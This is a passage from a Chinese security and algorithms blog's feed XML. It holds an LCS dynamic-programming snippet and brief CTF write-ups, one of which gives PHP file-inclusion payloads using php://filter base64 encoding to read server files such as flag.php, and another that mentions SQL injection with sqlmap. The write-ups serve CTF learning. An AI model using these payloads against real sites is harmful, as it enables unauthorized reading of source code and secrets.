<span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> x;</span><br><span class="line"><span class="built_in">string</span> z;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">105</span>][<span class="number">105</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;z)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> len1 = x.size();<span class="comment">//8</span></span><br><span class="line"><span class="keyword">int</span> len2 = z.size();<span class="comment">//9</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i &lt;= len1; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>; j &lt;=len2; j++)</span><br><span class="line"><span class="keyword">if</span>(x[i<span class="number">-1</span>]==z[j<span class="number">-1</span>])<span class="comment">//i,j&gt;0,xi=zj</span></span><br><span class="line">dp[i][j] =dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">dp[i][j]= max(dp[i][j<span class="number">-1</span>], dp[i<span class="number">-1</span>][j]);<span class="comment">//i,j&gt;0,xi!=yj</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;dp[len1][len2]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;问题-A-最长公共子序列&quot;&gt;&lt;a href=&quot;#问题-A-最长公共子序列&quot; class=&quot;headerlink&quot; title=&quot;问题 A: 最长公共子序列&quot;&gt;&lt;/a&gt;问题 A: 最长公共子序列&lt;/h1&gt;&lt;p&gt;时间限制: 1 Sec  内存限制: 32 MB&lt;/p&gt;
      
    
    </summary>
    
      <category term="算法" scheme="https://singlemindedt.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://singlemindedt.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="动态规划" scheme="https://singlemindedt.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://singlemindedt.github.io/2019/09/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://singlemindedt.github.io/2019/09/24/文件包含漏洞/</id>
    <published>2019-09-23T16:13:50.000Z</published>
    <updated>2019-09-23T16:23:38.411Z</updated>
    
    <content type="html"><![CDATA[<p>php://filter（本地磁盘文件进行读取）<br>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p><p>用法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=xxx.php </span><br><span class="line">?filename=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=xxx.php </span><br><span class="line">一样。</span><br></pre></td></tr></table></figure><p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p><p>MOCTF上这道文件包含题，直接</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到一串base64编码解码得到flag</p><p>关于<a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;php://filter（本地磁盘文件进行读取）&lt;br&gt;元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。&lt;/p&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;figure class=&quot;highlight livecodeserver&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>NewsCenter</title>
    <link href="https://singlemindedt.github.io/2019/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B9%8BWeb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6-NewsCenter/"/>
    <id>https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-NewsCenter/</id>
    <published>2019-09-10T15:45:00.000Z</published>
    <updated>2019-09-27T15:42:02.629Z</updated>
    
    <content type="html"><![CDATA[<p>打开链接，出现如下页面：<br><img src="https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG" alt="N1"></p><p>尝试是否为sql注入：<br>抓包：<br><img src="https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N0.PNG" alt="N0"><br>利用sqlmap,</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开链接，出现如下页面：&lt;br&gt;&lt;img src=&quot;https://dev.tencent.com/u/Single-minded_T/p/Single-minded_T/git/raw/master/images/N1.PNG&quot; alt=&quot;N1&quot;&gt;&lt;/p&gt;
&lt;p&gt;尝试是否
      
    
    </summary>
    
      <category term="Writeup" scheme="https://singlemindedt.github.io/categories/Writeup/"/>
    
      <category term="Web" scheme="https://singlemindedt.github.io/categories/Writeup/Web/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ics-06</title>
    <link href="https://singlemindedt.github.io/2019/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B9%8BWeb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6-ics-06/"/>
    <id>https://singlemindedt.github.io/2019/09/10/攻防世界之Web高手进阶-ics-06/</id>
    <published>2019-09-10T09:00:00.000Z</published>
    <updated>2019-09-10T15:45:13.006Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。<br><img src="/images/ics1.png" alt><br>进入页面只有报表中心可以点击，有一个输入框，各种fuzzing，没成功，后来才知道直接爆破就行。。。<br><img src="/images/ics2.png" alt></p><p>关于<a href="http://single-minded_t.coding.me/2019/09/05/攻防世界之Web新手（7-12）/" target="_blank" rel="noopener">爆破</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目描述：&quot;&gt;&lt;a href=&quot;#题目描述：&quot; class=&quot;headerlink&quot; title=&quot;题目描述：&quot;&gt;&lt;/a&gt;题目描述：&lt;/h2&gt;&lt;p&gt;云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。&lt;br&gt;&lt;img src=
      
    
    </summary>
    
      <category term="Writeup" scheme="https://singlemindedt.github.io/categories/Writeup/"/>
    
      <category term="Web" scheme="https://singlemindedt.github.io/categories/Writeup/Web/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
</feed>
